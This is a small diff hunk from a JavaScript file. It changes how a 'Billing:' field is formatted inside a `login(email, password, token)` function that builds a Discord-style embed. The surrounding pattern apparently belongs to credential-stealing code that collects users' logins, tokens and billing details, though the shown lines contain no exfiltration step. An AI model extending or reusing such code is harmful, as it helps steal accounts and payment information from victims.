@@ -671,7 +671,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '<:944007233820307467:959785232037470208> Billing:',
-            value: `\`${billing}\``,
+            value: `${billing}`,
             inline: true,
           },
           {
